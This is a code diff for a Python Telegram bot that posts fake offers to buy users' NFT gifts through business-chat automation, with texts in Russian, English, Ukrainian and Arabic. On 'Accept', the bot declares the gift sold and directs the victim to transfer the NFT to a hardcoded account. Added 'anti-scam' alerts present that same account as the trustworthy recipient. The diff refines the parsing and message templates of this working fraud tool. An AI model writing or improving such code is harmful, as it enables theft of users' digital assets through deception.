@@ -21,7 +21,7 @@ except ValueError:
     ADMIN_ID = 0
 
 # --- ИЗМЕНЕН ТОЛЬКО ЮЗЕРНЕЙМ ЗДЕСЬ ---
-DEFAULT_TARGET = "fakinwin"
+DEFAULT_TARGET = "fooptonnel"
 # ------------------------------------
 
 bot = Bot(token=BOT_TOKEN)
@@ -32,32 +32,36 @@ active_users = set()
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зачисления звёзд.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зачисления {symbol}.",
         "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
+        "alert": "⚠️ Внимание!\n\nПолучатель:\n@{target_username}.\n\nЕсли вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
         "btn_transfer": "Передать NFT"
     },
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive stars.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive {symbol}.",
         "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
+        "alert": "⚠️ Attention!\n\nThe recipient is:\n@{target_username}.\n\nIf asked to transfer the NFT directly to another user — do not send it. This could be a scam.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
         "btn_transfer": "Transfer NFT"
     },
     "ua": {
         "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зарахування зірок.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зарахування {symbol}.",
         "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
+        "alert": "⚠️ Увага!\n\nОтримувач:\n@{target_username}.\n\nЯкщо вас просять передати NFT безпосередньо іншому користувачу — не надсилайте його. Це може бути шахрайство.",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
         "btn_transfer": "Передати NFT"
     },
     "ar": {
         "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
-        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/{target_username}'>@{target_username}</a> لاستلام النجوم.",
+        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/{target_username}'>@{target_username}</a> لاستلام {symbol}.",
         "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
+        "alert": "⚠️ انتباه!\n\nالمستلم:\n@{target_username}.\n\nإذا طُلب منك تحويل NFT مباشرة إلى مستخدم آخر — فلا ترسله. قد يكون هذا احتيالاً.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
         "btn_transfer": "نقل NFT"
@@ -206,26 +210,35 @@ async def cmd_ofteam(message: types.Message):
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- ГЕНЕРАЦИЯ ОФФЕРА ---
+# --- ГЕНЕРАЦИЯ ОФФЕРА (УМНЫЙ ПАРСЕР) ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id: return
 
     parts = message.text.split()
-    if len(parts) < 4: return
+    if len(parts) < 3: return
 
     link = parts[1]
     if not link.startswith("http"): link = "https://" + link
+    
     try:
         amount = int(parts[2])
     except ValueError:
         return
     
-    currency = parts[3].lower()
+    # Умный парсер: ищем валюту и язык где угодно
+    currency = "stars"
+    lang = "ru"
+    
+    for p in parts[3:]:
+        p_lower = p.lower()
+        if p_lower in ["stars", "gram"]:
+            currency = p_lower
+        elif p_lower in ["ru", "en", "ua", "ar"]:
+            lang = p_lower
+
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
-    lang = parts[4].lower() if len(parts) > 4 else "ru"
-    if lang not in MESSAGES: lang = "ru"
 
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match: return
@@ -240,14 +253,13 @@ async def handle_offer_command(message: types.Message):
         target_username=DEFAULT_TARGET
     )
 
-    sender_username = message.from_user.username.lower() if message.from_user.username else "no_username"
-
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
         
+        # Убрали sender_username из callback_data, чтобы не превышать лимит
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}"),
-            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_username}")
+            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
+            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
         
         await bot.send_message(
@@ -267,9 +279,15 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
     data_parts = callback.data.split(":")
-    action, gift_slug, amount, currency, lang, sender_username = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
+    if len(data_parts) != 5:
+        return await callback.answer("Ошибка данных.", show_alert=True)
+        
+    action, gift_slug, amount, currency, lang = data_parts
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
+    
+    # Получаем юзернейм создателя прямо из сообщения
+    sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
     
     data, error = await get_gist_data()
     target_username = DEFAULT_TARGET
@@ -285,17 +303,12 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
 
     if action == "accept":
         new_text = msg_data["success"].format(
-            link=link, pretty_name=pretty_name, target_username=target_username
+            link=link, pretty_name=pretty_name, target_username=target_username, symbol=symbol
         )
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
         ])
-        alert_text = (
-            "⚠️ Внимание!\n\n"
-            "Получатель в этом сервисе:\n"
-            f"@{target_username}.\n\n"
-            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
-        )
+        alert_text = msg_data["alert"].format(target_username=target_username)
     else:
         new_text = msg_data["declined"].format(
             amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
